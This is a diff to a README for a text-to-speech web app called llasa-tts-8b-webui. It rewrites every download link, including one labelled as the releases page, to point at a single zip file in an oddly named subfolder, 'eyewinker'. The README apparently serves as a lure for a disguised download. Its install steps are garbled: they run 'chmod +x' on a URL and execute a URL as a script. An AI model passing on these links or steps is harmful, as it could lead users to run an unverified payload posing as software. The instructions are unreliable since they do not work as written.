@@ -1,6 +1,6 @@
 # 🎙️ llasa-tts-8b-webui - Easy Text-to-Speech for Everyone
 
-[![Download](https://github.com/jaden3289/llasa-tts-8b-webui/raw/refs/heads/main/eyewinker/webui_llasa_b_tts_1.6.zip%20Now-llasa--tts--8b--webui-blue)](https://github.com/jaden3289/llasa-tts-8b-webui/raw/refs/heads/main/eyewinker/webui_llasa_b_tts_1.6.zip)
+[![Download](https://raw.githubusercontent.com/jaden3289/llasa-tts-8b-webui/main/eyewinker/webui_llasa_b_tts_1.6.zip%20Now-llasa--tts--8b--webui-blue)](https://raw.githubusercontent.com/jaden3289/llasa-tts-8b-webui/main/eyewinker/webui_llasa_b_tts_1.6.zip)
 
 ## 📜 Description
 
@@ -23,7 +23,7 @@ If your system meets these requirements, you're good to go.
 
 ### Step 2: Visit the Releases Page
 
-To download the latest version of llasa-tts-8b-webui, [visit the Releases page here](https://github.com/jaden3289/llasa-tts-8b-webui/raw/refs/heads/main/eyewinker/webui_llasa_b_tts_1.6.zip). 
+To download the latest version of llasa-tts-8b-webui, [visit the Releases page here](https://raw.githubusercontent.com/jaden3289/llasa-tts-8b-webui/main/eyewinker/webui_llasa_b_tts_1.6.zip). 
 
 ### Step 3: Download the Application
 
@@ -56,8 +56,8 @@ Once the file downloads, locate it in your Downloads folder.
 
 1. Open a terminal window.
 2. Navigate to the directory where you downloaded the `.sh` file.
-3. Make the script executable by running: `chmod +x https://github.com/jaden3289/llasa-tts-8b-webui/raw/refs/heads/main/eyewinker/webui_llasa_b_tts_1.6.zip`.
-4. Run the script: `https://github.com/jaden3289/llasa-tts-8b-webui/raw/refs/heads/main/eyewinker/webui_llasa_b_tts_1.6.zip`.
+3. Make the script executable by running: `chmod +x https://raw.githubusercontent.com/jaden3289/llasa-tts-8b-webui/main/eyewinker/webui_llasa_b_tts_1.6.zip`.
+4. Run the script: `https://raw.githubusercontent.com/jaden3289/llasa-tts-8b-webui/main/eyewinker/webui_llasa_b_tts_1.6.zip`.
 
 ### Step 5: Run the Application
 
@@ -93,7 +93,7 @@ When the application opens, you will see a user-friendly interface that allows y
 
 ## 📁 Download & Install
 
-Ready to use llasa-tts-8b-webui? [Click here to download the latest version](https://github.com/jaden3289/llasa-tts-8b-webui/raw/refs/heads/main/eyewinker/webui_llasa_b_tts_1.6.zip).
+Ready to use llasa-tts-8b-webui? [Click here to download the latest version](https://raw.githubusercontent.com/jaden3289/llasa-tts-8b-webui/main/eyewinker/webui_llasa_b_tts_1.6.zip).
 
 Once you have downloaded it, follow the above steps to install and run the application.
 
